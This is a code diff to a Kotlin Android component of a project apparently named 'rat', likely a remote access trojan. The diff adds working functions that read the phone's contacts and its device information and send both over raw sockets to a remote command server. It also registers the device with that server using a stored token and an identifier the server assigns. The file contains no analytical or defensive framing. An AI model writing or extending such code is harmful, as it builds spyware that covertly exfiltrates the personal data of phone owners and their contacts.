@@ -9,6 +9,7 @@ import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
 import ru.awawa.rat.Application
+import ru.awawa.rat.helper.BuildInfo
 import ru.awawa.rat.helper.ContactsHelper
 import ru.awawa.rat.helper.Preferences
 import java.io.*
@@ -41,35 +42,65 @@ object Interactor {
             val token = Preferences.get<String>(Preferences.PreferencesField.TOKEN) ?: ""
             val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
 
-            val dataToSend = "connect:|:$uuid:|:$token\n".toByteArray()
+            val dataToSend = "connect${dataDivider}$uuid${dataDivider}$token\n".toByteArray()
             Log.d(TAG, "Sending $dataToSend")
             output.write(dataToSend)
 
             Log.d(TAG, "Waiting fo response")
-            val result = input.readLine()
+            val result = input.readLine().split(dataDivider)
+
+            if (result[0] == "ok") {
+                val newUuid = result[1]
+                Preferences.set(Preferences.PreferencesField.UUID, newUuid)
+            } else {
+                val errorMessage = result.getOrElse(1) { "" }
+                Log.e(TAG, "Connect failed: $errorMessage")
+            }
             Log.d(TAG, "Received $result")
+
+            socket.close()
         }
     }
 
-//    fun sendContacts() {
-//        GlobalScope.launch(Dispatchers.IO) {
-//            val socket = Socket()
-//            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
-//
-//            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
-//            val contacts = ContactsHelper.getContacts(Application.context)
-//            socket.getOutputStream().write("contacts:|:$uuid:|:$contacts\n".toByteArray())
-//            Log.w(TAG, "Sent: contacts:|:$uuid:|:$contacts")
-//
-//            val result = socket.getInputStream().bufferedReader().readLine()
-//            Log.d(TAG, "Answer: $result")
-//
-////            if (result[0] != "ok") {
-////                val error = result.getOrElse(1) { "" }
-////                Log.e(TAG, "Server answered with an error when contacts sent: $error")
-////            }
-//
-//            socket.close()
-//        }
-//    }
+    fun sendContacts() {
+        GlobalScope.launch(Dispatchers.IO) {
+            val socket = Socket()
+            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+
+            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
+            val contacts = ContactsHelper.getContacts(Application.context)
+            socket.getOutputStream().write("contacts${dataDivider}$uuid${dataDivider}$contacts\n".toByteArray())
+            Log.w(TAG, "Sent: contacts:|:$uuid:|:$contacts")
+
+            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)
+            Log.d(TAG, "Answer: $result")
+
+            if (result[0] != "ok") {
+                val error = result.getOrElse(1) { "" }
+                Log.e(TAG, "Contacts sending failed: $error")
+            }
+
+            socket.close()
+        }
+    }
+
+    fun sendPhoneInfo() {
+        GlobalScope.launch(Dispatchers.IO) {
+            val socket = Socket()
+            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+
+            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
+            val info = BuildInfo.getInfo()
+            socket.getOutputStream().write("phone_info${dataDivider}$uuid${dataDivider}$info\n".toByteArray())
+
+            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)
+
+            if (result[0] != "ok") {
+                val error = result.getOrElse(1) { "" }
+                Log.e(TAG, "Phone info sending failed: $error")
+            }
+
+            socket.close()
+        }
+    }
 }
